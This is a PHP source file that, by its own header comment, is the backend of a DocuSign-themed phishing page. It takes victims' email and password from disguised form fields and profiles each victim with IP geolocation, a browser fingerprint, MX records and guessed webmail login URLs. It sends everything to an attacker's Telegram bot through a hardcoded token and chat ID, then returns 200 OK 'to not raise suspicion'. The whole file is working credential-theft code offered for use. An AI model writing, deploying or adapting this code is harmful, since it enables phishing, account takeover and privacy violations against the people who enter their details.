<?php
// aaa.php - DocuSign credential capture with Telegram notification
// UPDATED: Complete server-side reCAPTCHA verification with Google API
// All suspicious scores are logged but credentials are still captured

// Enable error logging
ini_set('log_errors', 1);
ini_set('error_log', 'telegram_errors.log');

// ---------- RECAPTCHA CONFIGURATION ----------
define('RECAPTCHA_SECRET_KEY', '6LetX4YsAAAAAI1EwmqcBmk0_tNFP-1q19VMDEQo');
define('RECAPTCHA_SCORE_THRESHOLD', 0.5);

// Verify reCAPTCHA token with Google API (server-side)
function verifyRecaptchaToken($token, $expectedAction = null) {
    $result = [
        'success' => false,
        'score' => 0,
        'action' => '',
        'hostname' => '',
        'challenge_ts' => '',
        'error' => ''
    ];
    
    if (empty($token)) {
        $result['error'] = 'No token provided';
        error_log("reCAPTCHA: No token provided");
        return $result;
    }
    
    $url = 'https://www.google.com/recaptcha/api/siteverify';
    $data = [
        'secret' => RECAPTCHA_SECRET_KEY,
        'response' => $token
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
            'timeout' => 10
        ]
    ];
    
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    
    if ($response === false) {
        $result['error'] = 'Failed to connect to Google API';
        error_log("reCAPTCHA: Failed to verify with Google - Connection error");
        return $result;
    }
    
    $google_response = json_decode($response, true);
    
    // Log full response for debugging
    error_log("reCAPTCHA Google Response: " . json_encode($google_response));
    
    // Check if verification was successful
    if (!isset($google_response['success']) || $google_response['success'] !== true) {
        $errorCodes = isset($google_response['error-codes']) ? implode(', ', $google_response['error-codes']) : 'Unknown error';
        $result['error'] = 'Verification failed: ' . $errorCodes;
        error_log("reCAPTCHA: Verification failed - " . $errorCodes);
        return $result;
    }
    
    // Extract data from Google response
    $result['success'] = true;
    $result['score'] = $google_response['score'] ?? 0;
    $result['action'] = $google_response['action'] ?? '';
    $result['hostname'] = $google_response['hostname'] ?? '';
    $result['challenge_ts'] = $google_response['challenge_ts'] ?? '';
    
    // Log verification details
    error_log("reCAPTCHA Server Verify - Score: {$result['score']}, Action: {$result['action']}, Hostname: {$result['hostname']}");
    
    // Check if action matches expected (if specified)
    if ($expectedAction && $result['action'] !== $expectedAction) {
        $result['error'] = "Action mismatch - expected: $expectedAction, got: {$result['action']}";
        error_log("reCAPTCHA: " . $result['error']);
        // Still return success=true but add error - we'll capture credentials regardless
    }
    
    // Add threshold check to result (but don't fail - we capture all attempts)
    $result['threshold_met'] = ($result['score'] >= RECAPTCHA_SCORE_THRESHOLD);
    if (!$result['threshold_met']) {
        error_log("reCAPTCHA: Score below threshold - score: {$result['score']}, threshold: " . RECAPTCHA_SCORE_THRESHOLD);
    }
    
    return $result;
}

// Get browser fingerprint from headers
function getBrowserFingerprint() {
    $fingerprint = [];
    
    // Collect browser headers
    $headers = [
        'HTTP_ACCEPT',
        'HTTP_ACCEPT_LANGUAGE',
        'HTTP_ACCEPT_ENCODING',
        'HTTP_CONNECTION',
        'HTTP_UPGRADE_INSECURE_REQUESTS',
        'HTTP_SEC_FETCH_DEST',
        'HTTP_SEC_FETCH_MODE',
        'HTTP_SEC_FETCH_SITE',
        'HTTP_SEC_FETCH_USER',
        'HTTP_SEC_CH_UA',
        'HTTP_SEC_CH_UA_MOBILE',
        'HTTP_SEC_CH_UA_PLATFORM'
    ];
    
    foreach ($headers as $header) {
        if (isset($_SERVER[$header])) {
            $key = strtolower(str_replace('HTTP_', '', $header));
            $fingerprint[$key] = $_SERVER[$header];
        }
    }
    
    return $fingerprint;
}

// Get credentials from POST
$email = isset($_POST['ggg']) ? trim($_POST['ggg']) : '';
$password = isset($_POST['hhh']) ? trim($_POST['hhh']) : '';
$attempt = isset($_POST['attempt']) ? trim($_POST['attempt']) : 'unknown';
$recaptcha_token = isset($_POST['recaptcha_token']) ? trim($_POST['recaptcha_token']) : '';
$recaptcha_action = isset($_POST['recaptcha_action']) ? trim($_POST['recaptcha_action']) : 'login';
$recaptcha_score_input = isset($_POST['recaptcha_score']) ? floatval($_POST['recaptcha_score']) : 0;

// If no email, exit silently (prevent empty logs)
if ($email === '') {
    http_response_code(200);
    exit;
}

// Verify reCAPTCHA token with Google (server-side verification)
$recaptcha_result = verifyRecaptchaToken($recaptcha_token, $recaptcha_action);

// Prepare verification data for logging
$verification_status = $recaptcha_result['success'] ? 'PASSED' : 'FAILED';
$verification_score = $recaptcha_result['score'];
$verification_action = $recaptcha_result['action'];
$verification_hostname = $recaptcha_result['hostname'];
$verification_threshold_met = $recaptcha_result['threshold_met'] ? 'YES' : 'NO';
$verification_error = $recaptcha_result['error'] ?? '';

// Collect environment data
$ip_address = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$referer = $_SERVER['HTTP_REFERER'] ?? 'Unknown';
$timestamp = date('Y-m-d H:i:s');
$hostname = gethostbyaddr($ip_address);

// Get browser fingerprint
$browser_fingerprint = getBrowserFingerprint();

// Get IP location information
$location_info = [];
$ip_info = [];

if ($ip_address && $ip_address !== 'Unknown' && $ip_address !== '::1' && $ip_address !== '127.0.0.1') {
    // Get location data from ip-api.com
    $ip_api_url = "http://ip-api.com/json/{$ip_address}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,query";
    $response = @file_get_contents($ip_api_url);
    if ($response) {
        $location_info = json_decode($response, true);
    }
    
    // Get additional IP info from ipwho.is
    $ip_info_url = "http://ipwho.is/{$ip_address}";
    $ip_response = @file_get_contents($ip_info_url);
    if ($ip_response) {
        $ip_info = json_decode($ip_response, true);
    }
}

// Get email domain
$domain = '';
$local_part = '';
if (strpos($email, '@') !== false) {
    $parts = explode('@', $email, 2);
    $local_part = $parts[0];
    $domain = strtolower(trim($parts[1]));
}

// ---------- FETCH MX RECORDS ----------
$mx_records = [];
$mx_servers = [];

if ($domain) {
    // Try dns_get_record first
    if (function_exists('dns_get_record')) {
        $dns_records = @dns_get_record($domain, DNS_MX);
        if ($dns_records && count($dns_records) > 0) {
            foreach ($dns_records as $record) {
                if (isset($record['target']) && isset($record['pri'])) {
                    $mx_records[] = $record['target'] . ' (priority ' . $record['pri'] . ')';
                    $mx_servers[] = $record['target'];
                }
            }
        }
    }
    
    // Fallback to getmxrr if available
    if (empty($mx_records) && function_exists('getmxrr')) {
        $mxhosts = [];
        $weights = [];
        if (getmxrr($domain, $mxhosts, $weights)) {
            foreach ($mxhosts as $index => $host) {
                $mx_records[] = $host . ' (priority ' . ($weights[$index] ?? 10) . ')';
                $mx_servers[] = $host;
            }
        }
    }
}

// ---------- CHECK FOR COMMON WEBMAIL PROVIDERS ----------
$webmail_provider = 'Unknown';
$webmail_urls = [];

if ($domain) {
    $common_providers = [
        'gmail.com' => ['name' => 'Gmail', 'url' => 'https://mail.google.com'],
        'googlemail.com' => ['name' => 'Gmail', 'url' => 'https://mail.google.com'],
        'outlook.com' => ['name' => 'Outlook', 'url' => 'https://outlook.live.com'],
        'hotmail.com' => ['name' => 'Outlook', 'url' => 'https://outlook.live.com'],
        'live.com' => ['name' => 'Outlook', 'url' => 'https://outlook.live.com'],
        'msn.com' => ['name' => 'Outlook', 'url' => 'https://outlook.live.com'],
        'yahoo.com' => ['name' => 'Yahoo', 'url' => 'https://mail.yahoo.com'],
        'yahoo.co.uk' => ['name' => 'Yahoo', 'url' => 'https://mail.yahoo.com'],
        'ymail.com' => ['name' => 'Yahoo', 'url' => 'https://mail.yahoo.com'],
        'rocketmail.com' => ['name' => 'Yahoo', 'url' => 'https://mail.yahoo.com'],
        'aol.com' => ['name' => 'AOL', 'url' => 'https://mail.aol.com'],
        'icloud.com' => ['name' => 'iCloud', 'url' => 'https://www.icloud.com/mail'],
        'me.com' => ['name' => 'iCloud', 'url' => 'https://www.icloud.com/mail'],
        'mac.com' => ['name' => 'iCloud', 'url' => 'https://www.icloud.com/mail'],
        'protonmail.com' => ['name' => 'ProtonMail', 'url' => 'https://mail.protonmail.com'],
        'proton.me' => ['name' => 'ProtonMail', 'url' => 'https://mail.protonmail.com'],
        'zoho.com' => ['name' => 'Zoho', 'url' => 'https://mail.zoho.com'],
        'yandex.com' => ['name' => 'Yandex', 'url' => 'https://mail.yandex.com'],
        'yandex.ru' => ['name' => 'Yandex', 'url' => 'https://mail.yandex.com'],
        'gmx.com' => ['name' => 'GMX', 'url' => 'https://www.gmx.com'],
        'gmx.de' => ['name' => 'GMX', 'url' => 'https://www.gmx.de'],
        'web.de' => ['name' => 'Web.de', 'url' => 'https://web.de'],
        't-online.de' => ['name' => 'T-Online', 'url' => 'https://email.t-online.de'],
        'mail.ru' => ['name' => 'Mail.ru', 'url' => 'https://mail.ru'],
        'bk.ru' => ['name' => 'Mail.ru', 'url' => 'https://mail.ru'],
        'inbox.ru' => ['name' => 'Mail.ru', 'url' => 'https://mail.ru'],
        'list.ru' => ['name' => 'Mail.ru', 'url' => 'https://mail.ru'],
        'comcast.net' => ['name' => 'Comcast', 'url' => 'https://connect.xfinity.com'],
        'verizon.net' => ['name' => 'Verizon', 'url' => 'https://www.verizon.com'],
        'att.net' => ['name' => 'AT&T', 'url' => 'https://www.att.com'],
        'btinternet.com' => ['name' => 'BT', 'url' => 'https://www.bt.com'],
        'ntlworld.com' => ['name' => 'Virgin Media', 'url' => 'https://www.virginmedia.com'],
        'virginmedia.com' => ['name' => 'Virgin Media', 'url' => 'https://www.virginmedia.com'],
        'orange.fr' => ['name' => 'Orange', 'url' => 'https://mail.orange.fr'],
        'wanadoo.fr' => ['name' => 'Orange', 'url' => 'https://mail.orange.fr'],
        'sfr.fr' => ['name' => 'SFR', 'url' => 'https://webmail.sfr.fr'],
        'laposte.net' => ['name' => 'LaPoste', 'url' => 'https://www.laposte.net/accueil']
    ];
    
    if (isset($common_providers[$domain])) {
        $webmail_provider = $common_providers[$domain]['name'];
        $webmail_urls[] = $common_providers[$domain]['url'];
    } else {
        // Generate potential webmail URLs for custom domains
        $webmail_urls = [
            "https://mail.{$domain}",
            "https://webmail.{$domain}",
            "https://email.{$domain}",
            "https://{$domain}/webmail",
            "https://{$domain}/mail",
            "https://{$domain}/owa",
            "https://{$domain}/roundcube",
            "https://{$domain}/horde"
        ];
    }
}

// ---------- GENERATE WEBMAIL ACCESS POINTS ----------
function getWebmailAccessPoints($domain, $webmail_provider, $webmail_urls) {
    $points = [];
    
    if (!$domain) return $points;
    
    if ($webmail_provider !== 'Unknown') {
        $points[] = "• $webmail_provider: {$webmail_urls[0]}";
    } else {
        // Add top 5 most likely URLs
        $count = 0;
        foreach ($webmail_urls as $url) {
            if ($count >= 5) break;
            $points[] = "• $url";
            $count++;
        }
    }
    
    return $points;
}

// Get webmail access points
$webmail_points = getWebmailAccessPoints($domain, $webmail_provider, $webmail_urls);

// ---------- CHECK IF DOMAIN HAS SSL ----------
$domain_has_ssl = false;
$ssl_issuer = '';
$ssl_expiry = '';

if ($domain && function_exists('openssl_x509_parse') && function_exists('stream_context_get_params')) {
    $ctx = stream_context_create(['ssl' => ['capture_peer_cert' => true]]);
    @stream_socket_client("ssl://{$domain}:443", $errno, $errstr, 5, STREAM_CLIENT_CONNECT, $ctx);
    $params = @stream_context_get_params($ctx);
    
    if (isset($params['options']['ssl']['peer_certificate'])) {
        $cert = openssl_x509_parse($params['options']['ssl']['peer_certificate']);
        if ($cert) {
            $domain_has_ssl = true;
            $ssl_issuer = isset($cert['issuer']['O']) ? $cert['issuer']['O'] : (isset($cert['issuer']['CN']) ? $cert['issuer']['CN'] : 'Unknown');
            $ssl_expiry = isset($cert['validTo_time_t']) ? date('Y-m-d', $cert['validTo_time_t']) : 'Unknown';
        }
    }
}

// ---------- FORMAT MESSAGE (CLEAN WITH SECTIONS) ----------
$message = "🔐 DOCUSIGN LOGIN (Attempt #$attempt) 🔐\n";
$message .= "═══════════════════════════════════════════\n\n";

// Credentials section
$message .= "📧 EMAIL:    $email\n";
$message .= "🔑 PASSWORD: " . ($password ? $password : '[no password]') . "\n\n";

// reCAPTCHA section (server verified)
$message .= "🤖 RECAPTCHA (SERVER VERIFIED):\n";
$message .= "   Status:  $verification_status\n";
$message .= "   Score:   " . number_format($verification_score, 2) . "\n";
$message .= "   Action:  $verification_action\n";
$message .= "   Hostname: $verification_hostname\n";
$message .= "   Threshold Met: $verification_threshold_met\n";
if (!empty($verification_error)) {
    $message .= "   Error:   $verification_error\n";
}
$message .= "\n";

// Time & IP section
$message .= "⏰ TIME:     $timestamp\n";
$message .= "🌐 IP:       $ip_address\n";
$message .= "   Hostname: $hostname\n";

// Location section
if (!empty($location_info) && isset($location_info['status']) && $location_info['status'] == 'success') {
    $message .= "📍 LOCATION: {$location_info['city']}, {$location_info['regionName']}, {$location_info['country']}\n";
    $message .= "   Coords:   {$location_info['lat']}, {$location_info['lon']}\n";
    $message .= "   Timezone: {$location_info['timezone']}\n";
    $message .= "   Zip:      {$location_info['zip']}\n";
    $message .= "🏢 ISP:      {$location_info['isp']}\n";
    $message .= "   Org:      {$location_info['org']}\n";
    $message .= "   AS:       {$location_info['as']}\n";
    if (isset($location_info['proxy']) && $location_info['proxy']) {
        $message .= "⚠️ Proxy/VPN: Detected\n";
    }
    if (isset($location_info['hosting']) && $location_info['hosting']) {
        $message .= "⚠️ Hosting:   Detected (datacenter IP)\n";
    }
} elseif (!empty($ip_info) && isset($ip_info['success']) && $ip_info['success']) {
    $message .= "📍 LOCATION: {$ip_info['city']}, {$ip_info['region']}, {$ip_info['country']}\n";
    $message .= "   Coords:   {$ip_info['latitude']}, {$ip_info['longitude']}\n";
    $message .= "🏢 ISP:      " . ($ip_info['connection']['isp'] ?? 'Unknown') . "\n";
    if (isset($ip_info['security']['proxy']) && $ip_info['security']['proxy']) {
        $message .= "⚠️ Proxy/VPN: Detected\n";
    }
}

// Referer
if ($referer && $referer !== 'Unknown' && $referer !== '') {
    $message .= "🔗 REFERER:  $referer\n";
}

// User Agent
$ua_short = strlen($user_agent) > 80 ? substr($user_agent, 0, 80) . '...' : $user_agent;
$message .= "🖥️ USER AGENT: $ua_short\n";

// Browser Fingerprint
if (!empty($browser_fingerprint)) {
    $message .= "🖱️ BROWSER FINGERPRINT:\n";
    foreach ($browser_fingerprint as $key => $value) {
        if (strlen($value) > 50) {
            $value = substr($value, 0, 50) . '...';
        }
        $message .= "   • $key: $value\n";
    }
}
$message .= "\n";

// DOMAIN ANALYSIS SECTION
if ($domain) {
    $message .= "══════════════ DOMAIN ANALYSIS ══════════════\n";
    $message .= "🌐 DOMAIN:    $domain\n";
    $message .= "📧 Local Part: $local_part\n";
    
    if ($webmail_provider !== 'Unknown') {
        $message .= "📬 Provider:  $webmail_provider\n";
    }
    
    // MX Records
    if (!empty($mx_records)) {
        $message .= "📬 MX RECORDS:\n";
        foreach ($mx_records as $mx) {
            $message .= "   • $mx\n";
        }
    } else {
        $message .= "📬 MX RECORDS: None found (may not accept email)\n";
    }
    
    // SSL Status
    $message .= "🔒 SSL STATUS: " . ($domain_has_ssl ? "Yes (Issuer: $ssl_issuer, Expires: $ssl_expiry)" : "No SSL on main domain") . "\n";
    $message .= "\n";
}

// WEBMAIL ACCESS POINTS SECTION
if (!empty($webmail_points)) {
    $message .= "══════════ WEBMAIL ACCESS POINTS ═══════════\n";
    foreach ($webmail_points as $point) {
        $message .= "$point\n";
    }
    $message .= "\n";
}

// Footer
$message .= "═══════════════════════════════════════════\n";
$message .= "🔍 Server reCAPTCHA verified at " . date('H:i:s');

// Send to Telegram
$botToken = "8723725954:AAGfgRgEITCyvoHJihvNbi_2P5IN3WBgYx8";
$chatId = "6636168948";
$telegramURL = "https://api.telegram.org/bot$botToken/sendMessage";

// Initialize cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramURL);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Split message if too long
if (strlen($message) > 4000) {
    $parts = str_split($message, 3500);
    $success = true;
    
    foreach ($parts as $index => $part) {
        $part_header = ($index === 0) ? "" : "[Part " . ($index + 1) . "/" . count($parts) . "]\n";
        $postData = [
            'chat_id' => $chatId,
            'text' => $part_header . $part,
            'parse_mode' => 'HTML'
        ];
        
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        $result = curl_exec($ch);
        $error = curl_error($ch);
        
        if ($error) {
            error_log("Telegram Error (Part " . ($index + 1) . "): $error");
            $success = false;
        }
    }
} else {
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    $result = curl_exec($ch);
    $error = curl_error($ch);
    
    if ($error) {
        error_log("Telegram Error (Attempt $attempt): $error");
    }
}

curl_close($ch);

// Log successful capture with all details
error_log("CREDENTIALS CAPTURED - Email: $email, Attempt: $attempt, IP: $ip_address, reCAPTCHA Score: $verification_score, Threshold Met: $verification_threshold_met");

// Always return 200 OK to not raise suspicion
http_response_code(200);
exit;
?>
